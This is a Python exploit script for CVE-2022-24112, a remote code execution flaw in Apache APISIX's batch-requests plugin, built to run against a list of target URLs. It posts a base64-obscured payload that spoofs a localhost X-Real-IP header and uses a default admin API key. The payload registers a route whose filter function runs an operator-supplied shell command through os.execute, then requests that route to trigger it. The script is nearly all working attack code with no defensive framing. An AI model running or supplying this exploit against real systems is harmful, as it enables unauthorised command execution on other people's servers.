#coding:utf-8
import requests
import re
import base64

poxy = {
    'http':'192.168.1.117:8888'
}

def baner():
    print("#"*60)
    print("Apache APISIX batch-requests RCE(CVE-2022-24112)")
    print("#"*60)

def RCE(url):
    try:
        headers = {
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:95.0) Gecko/20100101 Firefox/95.0',
            'Content-Type': 'application/json'
        }

        payload = 'eyJoZWFkZXJzIjp7IlgtUmVhbC1JUCI6IjEyNy4wLjAuMSIsIkNvbnRlbnQtVHlwZSI6ImFwcGxpY2F0aW9uL2pzb24ifSwidGltZW91dCI6MTUwMCwicGlwZWxpbmUiOlt7Im1ldGhvZCI6IlBVVCIsInBhdGgiOiIvYXBpc2l4L2FkbWluL3JvdXRlcy9pbmRleD9hcGlfa2V5PWVkZDFjOWYwMzQzMzVmMTM2Zjg3YWQ4NGI2MjVjOGYxIiwiYm9keSI6IntcclxuIFwibmFtZVwiOiBcInRlc3RcIiwgXCJtZXRob2RcIjogW1wiR0VUXCJdLFxyXG4gXCJ1cmlcIjogXCIvYXBpL3Rlc3RcIixcclxuIFwidXBzdHJlYW1cIjp7XCJ0eXBlXCI6XCJyb3VuZHJvYmluXCIsXCJub2Rlc1wiOntcImh0dHBiaW4ub3JnOjgwXCI6MX19XHJcbixcclxuXCJmaWx0ZXJfZnVuY1wiOiBcImZ1bmN0aW9uKHZhcnMpIG9zLmV4ZWN1dGUoJ0NtZCcpOyByZXR1cm4gdHJ1ZSBlbmRcIn0ifV19'
        requests.packages.urllib3.disable_warnings()
        if requests.post(url+'/apisix/batch-requests'.strip(),headers=headers,data=base64.b64decode(payload).decode().replace('Cmd',cmd),verify=False,timeout=5).status_code == 200:
            requests.packages.urllib3.disable_warnings()
            requests.get(url+'/api/test',verify=False,headers=headers)
            print('Successful exploit',url)
        else:
            pass
            print('No vulnerabilities found:',url)

    except Exception as e1:
        print(e1)
        urlErrorExcept = str(e1)
        Errorlist_host = re.findall(r'host=[\'"]?([^\'" >]+)', urlErrorExcept)
        Errorlist_port = re.findall(r'port=[\'"]?([^\'" )]+)', urlErrorExcept)
        print(Errorlist_host,Errorlist_port)
        print('无法连接目标：', Errorlist_host[0] + ':' + Errorlist_port[0])

if __name__ == '__main__':
    urls = open('url.txt','r').read()
    baner()
    cmd = input("Cmd:")
    for url in urls.split():
        print("Scan:",url)
        RCE(url)
